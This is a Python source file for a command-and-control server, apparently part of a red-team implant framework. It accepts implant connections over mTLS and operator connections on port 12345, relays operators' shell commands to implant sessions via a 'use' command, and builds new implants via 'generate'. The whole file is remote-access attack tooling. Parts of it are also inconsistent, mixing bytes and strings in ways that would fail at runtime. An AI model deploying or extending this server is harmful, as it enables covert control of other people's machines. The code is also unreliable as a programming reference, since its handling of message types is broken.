#!/usr/bin/env python3
# TODO: Convert CLI to CMD2
import logging
import sys


from mtls import mtls
from generate.generate import generate
from queue import Queue
from handler.handler import Handler
from pb import operatorpb_pb2

import socket
import threading

class C2Server(object):
    connections = []

    def __init__(self):
        self.shutdown = 0
        logging.basicConfig(filename="Command Log.txt", level=logging.INFO)

        ## Generating stuff for implant comms ##
        print("Listening for implants...")
        self.requestq = Queue() #this is a shared queue between the handler and the listner, which fills with implant registration
        self.implantlistener = mtls.Listener(self.requestq) #begins implant listener w/ mtls encryption

        ## Generating stuff for operator comms ##
        print("Listening for operators...")
        self.clients = list()

        self.handler = Handler(self.requestq, self.clients)
        self.handler.start()

        self.host = ''
        self.port = 12345
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.sock.bind((self.host, self.port))
        threading.Thread(target=self.listen).start() #this is so we can listen and have execute commands from server console

    def serverMain(self):
        while self.shutdown == 0:
            pass

    # Turn message into a protobuf Message and ssend to client
    def sendClient(self, message, client):
        response = operatorpb_pb2.ServerCmdOutput(cmdOutput=message)

        message = operatorpb_pb2.Message(
            message_type=operatorpb_pb2.Message.MessageType.ServerCmdOutput,
            data=response.SerializeToString()
        )

        client.send(message.SerializeToString())

    def shell_session(self, session_id, client):
            conn, addr = self.implantlistener.sessions.get(session_id) 
            
            # send to client that new session is connected
            message = operatorpb_pb2.Message(
                message_type=operatorpb_pb2.Message.MessageType.SessionConnected,
                data = operatorpb_pb2.SessionConnected(addr=str(addr)).SerializeToString()
            )

            client.send(message.SerializeToString())

            while True:
                userin = client.recv(1024)

                message = operatorpb_pb2.Message()
                message.ParseFromString(userin)

                if message.message_type==operatorpb_pb2.Message.MessageType.ServerCmd:
                    server_cmd = operatorpb_pb2.ServerCmd()
                    server_cmd.ParseFromString(message.data)


                    if server_cmd.cmd == b"exit":
                       self.sendClient((f"Exiting session {addr}\n").encode("ascii"),client)
                       break 

                    output = mtls.session(conn, server_cmd.cmd)

                    if not output:
                        break

                    self.sendClient(output.decode("ascii"),client)

    def executecommand(self, command, client):
        #command is an array of strings
        if len(command) < 1:
            self.sendClient("Please enter a command", client)
            return

        elif command[0] == "sessions":
            return str(self.implantlistener.sessions.list()).encode('ascii')

        # Interact with a session
        elif command[0] == "use":
            if command[1] not in self.implantlistener.sessions.list():
                return (b"Session doesn't exist")

            if len(command) == 2:
                self.shell_session(command[1], client) 
            else:
                return(b"Usage: use <session>")

        # Compile an implant
        elif command[0] == "generate":
            print("Generating the implant...")
            generate(self.implantlistener.client_certs)

        else:
            return(b"Unknown Command")

    def listen(self):
        numberOfUsers = 5
        self.sock.listen(numberOfUsers)
        while True: #keep listening, start a new thread when a client connects
            client, address = self.sock.accept()

            self.clients.append(client)
            self.handler.brodcastImplants(client)

            print("[+]Connected to a new client at " + address[0] + ":" + str(address[1]) )
            t = threading.Thread(target = self.listenToClient,args = (client,address)).start()
            self.connections.append(address) 

    def listenToClient(self, client, address):
        size = 1024
        while True:
            data = client.recv(size)

            message = operatorpb_pb2.Message()
            message.ParseFromString(data)

            if message.message_type==operatorpb_pb2.Message.MessageType.ServerCmd:
                server_cmd = operatorpb_pb2.ServerCmd()
                server_cmd.ParseFromString(message.data)
                commandStr = server_cmd.cmd.lower()

                logging.info("Command: " + commandStr)

                if (commandStr != "exit"):
                    response = self.executecommand(commandStr.split(), client)
                    if response:
                        self.sendClient(response, client)
                else:
                    print("[+]Disconnected client " + address[0] +":"+ str(address[1]))
                    client.close()
                    self.clients.remove(client)
                    break

def main():
    C2Server().serverMain()


if __name__ == "__main__":
    main()
